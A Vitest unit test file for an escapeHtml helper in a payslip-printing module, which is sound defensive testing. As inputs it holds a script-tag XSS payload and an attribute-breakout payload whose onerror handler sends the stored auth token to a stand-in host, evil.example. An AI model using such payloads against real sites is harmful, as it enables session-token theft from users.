import { describe, expect, it } from 'vitest';
import { escapeHtml } from './printPayslip';

describe('escapeHtml', () => {
  it('neutralizes a script tag payload', () => {
    const payload = '<script>alert(document.cookie)</script>';
    const escaped = escapeHtml(payload);
    expect(escaped).not.toContain('<script>');
    expect(escaped).toBe('&lt;script&gt;alert(document.cookie)&lt;/script&gt;');
  });

  it('neutralizes an attribute-breakout payload (the bank/logo_url vector found in review)', () => {
    // ตัวอย่างจริงจากรายงานความปลอดภัย: ช่องธนาคาร/URL โลโก้ ที่ฝัง onerror handler ผ่านการแหก attribute
    const payload = `x" onerror="fetch('https://evil.example?c='+localStorage.getItem('token'))`;
    const escaped = escapeHtml(payload);
    expect(escaped).not.toContain('"');
    expect(escaped).toContain('&quot;');
  });

  it('escapes all five special characters', () => {
    expect(escapeHtml(`& < > " '`)).toBe('&amp; &lt; &gt; &quot; &#39;');
  });

  it('passes plain text through unchanged', () => {
    expect(escapeHtml('สมชาย ใจดี')).toBe('สมชาย ใจดี');
  });

  it('treats null/undefined as empty string rather than the literal words', () => {
    expect(escapeHtml(null)).toBe('');
    expect(escapeHtml(undefined)).toBe('');
  });
});
